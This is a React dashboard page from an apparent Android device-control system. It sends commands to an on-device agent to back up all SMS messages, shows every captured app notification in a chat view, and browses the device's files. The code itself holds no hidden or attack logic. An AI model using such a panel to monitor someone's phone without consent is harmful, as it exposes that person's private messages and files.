// src/pages/DeviceDetailPage.tsx
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { devicesApi, commandsApi } from '../services/api';
import { useDashboardStore } from '../store/dashboardStore';
import { wsService } from '../services/wsService';
import { FileManager } from '../components/FileManager';
import { NotificationDetailModal } from '../components/NotificationDetailModal';
import type { DashboardEvent, Notification } from '../types';

const COMMANDS = [
  { type: 'get_device_info', label: '📋 Get Device Info', description: 'Fetch full device details' },
  { type: 'backup_sms', label: '💬 Backup SMS', description: 'Read and backup all SMS messages' },
  { type: 'send_agent_logs', label: '📄 Agent Logs', description: 'Retrieve agent debug logs' },
];

function formatDate(dateStr: string | null | undefined) {
  if (!dateStr) return '—';
  return new Date(dateStr).toLocaleString();
}

const STATUS_LABELS: Record<string, string> = {
  PENDING: 'Pending', QUEUED: 'Queued', SENT: 'Sent',
  IN_PROGRESS: 'In Progress', SUCCESS: 'Success', FAILURE: 'Failed', TIMEOUT: 'Timeout',
};

export function DeviceDetailPage() {
  const { deviceUid } = useParams<{ deviceUid: string }>();
  const navigate = useNavigate();
  const queryClient = useQueryClient();
  const deviceStates = useDashboardStore((s) => s.deviceStates);
  const [lastResult, setLastResult] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<'commands' | 'notifications' | 'files'>('commands');
  const [latestCommandResult, setLatestCommandResult] = useState<any | null>(null);
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null);
  const [notificationsPage, setNotificationsPage] = useState(1);
  const [notificationsLimit, setNotificationsLimit] = useState(50);
  const [selectedPackage, setSelectedPackage] = useState<string | null>(null);
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const { data: deviceData, isLoading } = useQuery({
    queryKey: ['device', deviceUid],
    queryFn: () => devicesApi.getById(deviceUid!).then((r) => r.data.device),
    enabled: !!deviceUid,
  });

  const { data: commandsData } = useQuery({
    queryKey: ['device-commands', deviceUid],
    queryFn: () => commandsApi.getHistory(deviceUid!, 20).then((r) => r.data),
    enabled: !!deviceUid,
    refetchInterval: 5_000,
  });

  const { data: notifsData, isLoading: notifsLoading } = useQuery({
    queryKey: ['device-notifications', deviceUid, notificationsPage, notificationsLimit],
    queryFn: () => devicesApi.getNotifications(deviceUid!, notificationsPage, notificationsLimit).then((r) => r.data),
    enabled: !!deviceUid && activeTab === 'notifications',
    refetchInterval: 10_000,
  });

  // جلب آخر heartbeat محفوظ في DB – يعمل للـ online والـ offline
  const { data: latestHeartbeatData } = useQuery({
    queryKey: ['device-heartbeat-latest', deviceUid],
    queryFn: () => devicesApi.getLatestHeartbeat(deviceUid!).then((r) => r.data.heartbeat),
    enabled: !!deviceUid,
    staleTime: 30_000,   // تخزين مؤقت لـ 30 ثانية
  });

  // الاستماع للأحداث الحية من WebSocket (بما فيها نتائج الأوامر)
  useEffect(() => {
    const unsubscribe = wsService.on((event: DashboardEvent) => {
      if (event.event === 'command_result' && activeTab === 'files') {
        // Send to FileManager
        setLatestCommandResult(event);
      } else if (event.event === 'command_result') {
        // If it was another command, we invalidate the list
        queryClient.invalidateQueries({ queryKey: ['device-commands', deviceUid] });
      }
    });
    return () => unsubscribe();
  }, [activeTab, deviceUid, queryClient]);

  const dispatchMutation = useMutation({
    mutationFn: ({ commandType, params }: { commandType: string; params?: Record<string, unknown> }) =>
      commandsApi.dispatch(deviceUid!, commandType, params ?? {}),
    onSuccess: (res) => {
      setLastResult(`✅ ${res.data.message} (${res.data.commandId})`);
      queryClient.invalidateQueries({ queryKey: ['device-commands', deviceUid] });
    },
    onError: (err: any) => {
      setLastResult(`❌ Error: ${err.response?.data?.message ?? err.message}`);
    },
  });

  const liveState = deviceUid ? deviceStates[deviceUid] : null;
  const isOnline = liveState ? liveState.isOnline : deviceData?.isOnline;
  // الأولوية: Live WebSocket heartbeat → آخر heartbeat في DB
  const heartbeat = liveState?.lastHeartbeat ?? latestHeartbeatData;

  if (isLoading) {
    return <div className="loading-screen"><div className="spinner" /> Loading device...</div>;
  }

  if (!deviceData) {
    return (
      <div className="empty-state">
        <div className="empty-state-icon">❓</div>
        <div className="empty-state-text">Device not found</div>
        <button className="btn btn-ghost btn-sm mt-3" onClick={() => navigate('/devices')}>← Back</button>
      </div>
    );
  }

  return (
    <>
      {/* Header */}
      <div className="page-header">
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 4 }}>
            <button
              className="btn btn-ghost btn-sm"
              onClick={() => navigate('/devices')}
              style={{ padding: '4px 8px' }}
            >← Back</button>
            <span className={`status-badge ${isOnline ? 'online' : 'offline'}`}>
              <span className="dot" />
              {isOnline ? 'Online' : 'Offline'}
            </span>
          </div>
          <h1 className="page-title">{deviceData.model}</h1>
          <div className="page-subtitle mono">{deviceUid}</div>
        </div>
        <button
          className="btn btn-ghost btn-sm"
          onClick={() => navigate(`/devices/${deviceUid}/sms`)}
          style={{ gap: 6 }}
        >
          💬 SMS Backups
        </button>
      </div>

      <div style={{
        display: 'grid',
        gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr',
        gap: 16,
        marginBottom: 24
      }}>
        {/* Device Info Card */}
        <div className="card">
          <div className="card-header">
            <div className="card-title">📱 Device Info</div>
          </div>
          <table style={{ width: '100%', fontSize: 13 }}>
            <tbody>
              {[
                ['Model', deviceData.model],
                ['Manufacturer', deviceData.manufacturer],
                ['Android', deviceData.androidVersion],
                ['Serial', deviceData.serialNumber ?? '—'],
                ['Agent Version', deviceData.agentVersion],
                ['Enrolled', formatDate(deviceData.enrolledAt)],
                ['Last Seen', formatDate(deviceData.lastSeenAt)],
              ].map(([label, value]) => (
                <tr key={label}>
                  <td style={{ padding: '5px 0', color: 'var(--text-muted)', width: '40%' }}>{label}</td>
                  <td style={{ padding: '5px 0', color: 'var(--text-primary)', fontFamily: 'var(--font-mono)', fontSize: 12 }}>{value}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Heartbeat Card – يعمل online وoffline */}
        <div className="card">
          <div className="card-header">
            <div className="card-title">
              {isOnline ? '💓 Live Status' : '🕐 Last Known State'}
            </div>
            {!isOnline && heartbeat?.recordedAt && (
              <span style={{ fontSize: 11, color: 'var(--text-muted)' }}>
                {new Date(heartbeat.recordedAt).toLocaleString()}
              </span>
            )}
            {!isOnline && !heartbeat && (
              <span style={{ fontSize: 11, color: 'var(--text-muted)' }}>Device offline</span>
            )}
          </div>

          {heartbeat ? (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              {/* تنبيه إذا كانت البيانات قديمة (offline) */}
              {!isOnline && (
                <div style={{
                  padding: '6px 10px',
                  background: 'rgba(255,165,0,0.08)',
                  border: '1px solid rgba(255,165,0,0.25)',
                  borderRadius: 6,
                  fontSize: 11,
                  color: 'var(--accent-warning, #f59e0b)',
                }}>
                  ⚠️ Showing last recorded data — device is currently offline
                </div>
              )}

              {/* Battery */}
              <div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 12, marginBottom: 4 }}>
                  <span style={{ color: 'var(--text-muted)' }}>🔋 Battery</span>
                  <span style={{ color: 'var(--text-primary)', fontFamily: 'var(--font-mono)' }}>
                    {heartbeat.battery.level}%{heartbeat.battery.isCharging ? ' ⚡' : ''}
                  </span>
                </div>
                <div className="progress-bar">
                  <div
                    className={`progress-fill ${heartbeat.battery.level > 50 ? 'green' : heartbeat.battery.level > 20 ? 'orange' : 'red'}`}
                    style={{ width: `${heartbeat.battery.level}%` }}
                  />
                </div>
              </div>

              {/* Storage */}
              <div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 12, marginBottom: 4 }}>
                  <span style={{ color: 'var(--text-muted)' }}>💾 Storage Used</span>
                  <span style={{ color: 'var(--text-primary)', fontFamily: 'var(--font-mono)' }}>
                    {heartbeat.storage.usedPercent}%
                  </span>
                </div>
                <div className="progress-bar">
                  <div
                    className={`progress-fill ${heartbeat.storage.usedPercent > 90 ? 'red' : heartbeat.storage.usedPercent > 70 ? 'orange' : 'blue'}`}
                    style={{ width: `${heartbeat.storage.usedPercent}%` }}
                  />
                </div>
              </div>

              {/* Network */}
              <div style={{ display: 'flex', gap: 16 }}>
                <div>
                  <div style={{ fontSize: 11, color: 'var(--text-muted)', marginBottom: 2 }}>Network</div>
                  <div style={{ fontSize: 13, color: 'var(--accent-primary)', fontWeight: 600 }}>
                    {heartbeat.network.type === 'WIFI' ? '📶' : '📡'} {heartbeat.network.type}
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <div style={{ color: 'var(--text-muted)', fontSize: 13, paddingTop: 8 }}>
              {isOnline ? 'Waiting for first heartbeat...' : 'No data recorded yet'}
            </div>
          )}
        </div>
      </div>

      {/* Commands Panel */}
      <div className="card" style={{ marginBottom: 24 }}>
        <div className="card-header">
          <div className="card-title">⚡ Send Command</div>
        </div>

        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
          {COMMANDS.map((cmd) => (
            <button
              key={cmd.type}
              id={`cmd-${cmd.type}`}
              className="btn btn-ghost"
              disabled={dispatchMutation.isPending}
              onClick={() => dispatchMutation.mutate({ commandType: cmd.type })}
              title={cmd.description}
            >
              {cmd.label}
            </button>
          ))}
        </div>

        {lastResult && (
          <div style={{ marginTop: 12, padding: '10px 14px', background: 'var(--bg-surface)', borderRadius: 8, fontSize: 12, fontFamily: 'var(--font-mono)', color: 'var(--text-secondary)' }}>
            {lastResult}
          </div>
        )}
      </div>

      {/* Tabs: Commands / Notifications / Files */}
      <div className="card">
        <div style={{
          display: 'flex',
          gap: 0,
          marginBottom: 16,
          borderBottom: '1px solid var(--border)',
          overflowX: 'auto',
          scrollbarWidth: 'none',
          WebkitOverflowScrolling: 'touch'
        }}>
          {(['commands', 'notifications', 'files'] as const).map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              style={{
                padding: '8px 18px',
                background: 'none',
                border: 'none',
                borderBottom: `2px solid ${activeTab === tab ? 'var(--accent-primary)' : 'transparent'}`,
                color: activeTab === tab ? 'var(--accent-primary)' : 'var(--text-muted)',
                cursor: 'pointer',
                fontSize: 13,
                fontWeight: 600,
                textTransform: 'capitalize',
                transition: 'all 0.15s',
                marginBottom: -1,
                whiteSpace: 'nowrap',
              }}
            >
              {tab === 'commands' ? '📋 Command History' : tab === 'files' ? '📁 File Explorer' : '🔔 Notifications'}
            </button>
          ))}
        </div>

        {activeTab === 'commands' && (
          <div className="table-container">
            <table>
              <thead>
                <tr>
                  <th>Command</th>
                  <th>Status</th>
                  <th>Created</th>
                  <th>Completed</th>
                  <th>By</th>
                </tr>
              </thead>
              <tbody>
                {(commandsData?.commands ?? []).length === 0 ? (
                  <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-muted)', padding: 32 }}>No commands yet</td></tr>
                ) : (
                  (commandsData?.commands ?? []).map((cmd: any) => (
                    <tr key={cmd.commandId}>
                      <td><span className="mono" style={{ fontSize: 12 }}>{cmd.commandType}</span></td>
                      <td><span className={`cmd-status-badge ${cmd.status}`}>{STATUS_LABELS[cmd.status] ?? cmd.status}</span></td>
                      <td style={{ fontSize: 12 }}>{formatDate(cmd.createdAt)}</td>
                      <td style={{ fontSize: 12 }}>{formatDate(cmd.completedAt)}</td>
                      <td style={{ fontSize: 12 }}>{cmd.admin?.username ?? '—'}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        )}

        {activeTab === 'notifications' && (
          <>
            {/* Pagination Controls */}
            <div style={{ 
              padding: '12px 16px', 
              borderBottom: '1px solid var(--border)',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              flexWrap: 'wrap',
              gap: 12
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ fontSize: 12, color: 'var(--text-muted)' }}>Page:</span>
                <button
                  onClick={() => setNotificationsPage(1)}
                  disabled={notificationsPage === 1}
                  className="btn btn-ghost btn-sm"
                  style={{ padding: '4px 8px', fontSize: 11 }}
                >
                  First
                </button>
                <button
                  onClick={() => setNotificationsPage(Math.max(1, notificationsPage - 1))}
                  disabled={notificationsPage === 1}
                  className="btn btn-ghost btn-sm"
                  style={{ padding: '4px 8px', fontSize: 11 }}
                >
                  Previous
                </button>
                <span style={{ 
                  fontSize: 12, 
                  fontWeight: 600, 
                  color: 'var(--text-primary)',
                  minWidth: '80px',
                  textAlign: 'center'
                }}>
                  {notificationsPage} / {notifsData?.pages || 1}
                </span>
                <button
                  onClick={() => setNotificationsPage(Math.min(notifsData?.pages || 1, notificationsPage + 1))}
                  disabled={notificationsPage >= (notifsData?.pages || 1)}
                  className="btn btn-ghost btn-sm"
                  style={{ padding: '4px 8px', fontSize: 11 }}
                >
                  Next
                </button>
                <button
                  onClick={() => setNotificationsPage(notifsData?.pages || 1)}
                  disabled={notificationsPage >= (notifsData?.pages || 1)}
                  className="btn btn-ghost btn-sm"
                  style={{ padding: '4px 8px', fontSize: 11 }}
                >
                  Last
                </button>
              </div>
              
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ fontSize: 12, color: 'var(--text-muted)' }}>Show:</span>
                {[20, 50, 100, 200].map((n) => (
                  <button
                    key={n}
                    onClick={() => {
                      setNotificationsLimit(n);
                      setNotificationsPage(1); // Reset to first page when changing limit
                    }}
                    style={{
                      padding: '4px 10px',
                      borderRadius: 6,
                      border: '1px solid',
                      fontSize: 11,
                      fontWeight: 600,
                      cursor: 'pointer',
                      background: notificationsLimit === n ? 'var(--bg-surface)' : 'transparent',
                      borderColor: notificationsLimit === n ? 'rgba(255,255,255,0.15)' : 'var(--border)',
                      color: notificationsLimit === n ? 'var(--text-primary)' : 'var(--text-muted)',
                    }}
                  >
                    {n}
                  </button>
                ))}
              </div>
            </div>
            
            {/* Package Filter & Grouping */}
            {notifsData?.notifications && notifsData.notifications.length > 0 && (
              <div style={{ 
                padding: '12px 16px', 
                borderBottom: '1px solid var(--border)',
                background: 'var(--bg-secondary)',
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                flexWrap: 'wrap',
                gap: 12
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap' }}>
                  <span style={{ fontSize: 12, color: 'var(--text-muted)', fontWeight: 600 }}>
                    📦 Group by App:
                  </span>
                  {(() => {
                    // Group notifications by packageName
                    type GroupedData = Record<string, { count: number; appName: string }>;
                    const grouped: GroupedData = ((notifsData?.notifications) ?? []).reduce<GroupedData>((acc, n: any) => {
                      const pkg = n.packageName || 'unknown';
                      if (!acc[pkg]) {
                        acc[pkg] = { count: 0, appName: n.appName || pkg };
                      }
                      acc[pkg].count++;
                      return acc;
                    }, {});
                    
                    return Object.entries(grouped)
                      .sort(([,a], [,b]) => b.count - a.count)
                      .map(([pkg, data]: [string, { count: number; appName: string }]) => (
                        <button
                          key={pkg}
                          onClick={() => setSelectedPackage(selectedPackage === pkg ? null : pkg)}
                          style={{
                            padding: '6px 12px',
                            borderRadius: 20,
                            border: '1px solid',
                            fontSize: 11,
                            fontWeight: 600,
                            cursor: 'pointer',
                            display: 'flex',
                            alignItems: 'center',
                            gap: 6,
                            background: selectedPackage === pkg ? 'var(--accent-primary-glow)' : 'var(--bg-surface)',
                            borderColor: selectedPackage === pkg ? 'var(--accent-primary)' : 'var(--border)',
                            color: selectedPackage === pkg ? 'var(--accent-primary)' : 'var(--text-secondary)',
                            transition: 'all 0.15s'
                          }}
                          title={pkg}
                        >
                          <span>{data.appName}</span>
                          <span style={{
                            background: selectedPackage === pkg ? 'var(--accent-primary)' : 'var(--text-muted)',
                            color: 'white',
                            padding: '2px 6px',
                            borderRadius: 10,
                            fontSize: 10,
                            minWidth: 18,
                            textAlign: 'center'
                          }}>
                            {data.count}
                          </span>
                        </button>
                      ));
                  })()}
                  {selectedPackage && (
                    <button
                      onClick={() => setSelectedPackage(null)}
                      className="btn btn-ghost btn-sm"
                      style={{ padding: '4px 10px', fontSize: 11 }}
                    >
                      ✕ Clear filter
                    </button>
                  )}
                </div>
                <button
                  onClick={() => navigate(`/devices/${deviceUid}/notifications`)}
                  className="btn btn-primary btn-sm"
                  style={{ padding: '6px 14px', fontSize: 12 }}
                >
                  🔔 Open Full Chat View
                </button>
              </div>
            )}
            
            {/* Notifications Table */}
            <div className="table-container">
              <table>
                <thead>
                  <tr>
                    <th>App</th>
                    <th>Title</th>
                    <th>Message</th>
                    <th>Time</th>
                    <th style={{ textAlign: 'center' }}>Details</th>
                  </tr>
                </thead>
                <tbody>
                  {notifsLoading ? (
                    <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-muted)', padding: 32 }}>
                      <div className="spinner" style={{ margin: '0 auto 8px' }} /> Loading notifications...
                    </td></tr>
                  ) : (notifsData?.notifications ?? []).filter((n: any) => !selectedPackage || n.packageName === selectedPackage).length === 0 ? (
                    <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-muted)', padding: 32 }}>
                      {selectedPackage ? `No notifications from ${selectedPackage} on this page` : 'No notifications captured'}
                    </td></tr>
                  ) : (
                    (notifsData?.notifications ?? [])
                      .filter((n: any) => !selectedPackage || n.packageName === selectedPackage)
                      .map((n: any) => (
                      <tr key={n.id}>
                        <td>
                          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                            <div style={{
                              width: 30, height: 30, borderRadius: 8, background: 'var(--bg-surface)',
                              display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 15, flexShrink: 0,
                            }}>
                              📱
                            </div>
                            <div>
                              <div style={{ fontSize: 13, fontWeight: 600, color: 'var(--text-primary)' }}>{n.appName}</div>
                              <div className="mono text-muted" style={{ fontSize: 10 }}>{n.packageName}</div>
                            </div>
                          </div>
                        </td>
                        <td style={{ fontSize: 12, maxWidth: 180, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {n.title ?? <span style={{ color: 'var(--text-muted)', fontStyle: 'italic' }}>No title</span>}
                        </td>
                        <td style={{ fontSize: 12, color: 'var(--text-muted)', maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {n.text ?? '—'}
                        </td>
                        <td style={{ fontSize: 11, whiteSpace: 'nowrap' }}>{new Date(n.postedAt).toLocaleString()}</td>
                        <td style={{ textAlign: 'center' }}>
                          <button
                            id={`notif-details-${n.id}`}
                            className="btn btn-ghost btn-sm"
                            style={{ fontSize: 11, padding: '4px 10px', gap: 4 }}
                            onClick={() => setSelectedNotification(n as Notification)}
                            title="View full notification details"
                          >
                            🔍 Details
                          </button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
              
              {/* Pagination Info */}
              {notifsData && notifsData.total > 0 && (
                <div style={{
                  padding: '12px 16px',
                  borderTop: '1px solid var(--border)',
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  fontSize: 12,
                  color: 'var(--text-muted)'
                }}>
                  <div>
                    Showing {((notificationsPage - 1) * notificationsLimit) + 1} to {Math.min(notificationsPage * notificationsLimit, notifsData.total)} of {notifsData.total} notifications
                  </div>
                  <div>
                    Total pages: {notifsData.pages}
                  </div>
                </div>
              )}
            </div>
          </>
        )}

        {activeTab === 'files' && (
          <FileManager deviceUid={deviceUid!} latestCommandResult={latestCommandResult} />
        )}
      </div>

      {/* Notification Detail Modal */}
      <NotificationDetailModal
        notification={selectedNotification}
        onClose={() => setSelectedNotification(null)}
      />
    </>
  );
}
